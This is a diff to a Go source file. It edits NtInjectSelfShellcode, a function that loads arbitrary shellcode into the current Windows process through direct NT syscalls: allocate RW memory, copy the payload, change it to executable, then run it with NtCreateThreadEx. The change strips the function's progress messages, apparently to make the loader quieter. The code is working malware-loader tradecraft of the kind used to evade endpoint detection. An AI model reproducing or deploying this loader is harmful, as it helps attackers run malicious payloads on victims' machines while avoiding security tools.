@@ -989,20 +989,16 @@ func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
 
 // NtInjectSelfShellcode injects shellcode into the current process using direct syscalls ONLY
 // This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
-// Now using NtCreateThreadEx for true direct syscall thread creation
 func NtInjectSelfShellcode(payload []byte) error {
 	if len(payload) == 0 {
 		return fmt.Errorf("payload is empty")
 	}
-
-	fmt.Printf("Starting direct syscall self-injection of %d bytes...\n", len(payload))
 	currentProcess := ^uintptr(0) // Use pseudo-handle for current process
 
 	// Step 1: Allocate RW memory
 	var baseAddress uintptr
 	size := uintptr(len(payload))
 
-	fmt.Printf("Step 1: Allocating %d bytes of RW memory...\n", size)
 	status, err := NtAllocateVirtualMemory(
 		currentProcess,
 		&baseAddress,
@@ -1014,15 +1010,11 @@ func NtInjectSelfShellcode(payload []byte) error {
 	if err != nil || status != STATUS_SUCCESS {
 		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
 	}
-	fmt.Printf("  Allocated memory at: 0x%X\n", baseAddress)
 
 	// Step 2: Copy shellcode
-	fmt.Printf("Step 2: Copying shellcode to allocated memory...\n")
 	copy((*[1 << 30]byte)(unsafe.Pointer(baseAddress))[:len(payload)], payload)
-	fmt.Printf("  Shellcode copied successfully\n")
 
 	// Step 3: Change protection to RX
-	fmt.Printf("Step 3: Changing memory protection to RX...\n")
 	var oldProtect uintptr
 	status, err = NtProtectVirtualMemory(
 		currentProcess,
@@ -1034,10 +1026,8 @@ func NtInjectSelfShellcode(payload []byte) error {
 	if err != nil || status != STATUS_SUCCESS {
 		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
 	}
-	fmt.Printf("  Memory protection changed from 0x%X to PAGE_EXECUTE_READ\n", oldProtect)
 
 	// Step 4: Create thread using NtCreateThreadEx (true direct syscall)
-	fmt.Printf("Step 4: Creating thread using NtCreateThreadEx...\n")
 	var hThread uintptr
 	
 	// NtCreateThreadEx parameters:
@@ -1085,8 +1075,6 @@ func NtInjectSelfShellcode(payload []byte) error {
 	} else {
 		fmt.Printf("  Thread handle closed successfully\n")
 	}
-	
-	fmt.Printf("Direct syscall self-injection completed!\n")
 	return nil
 }
 
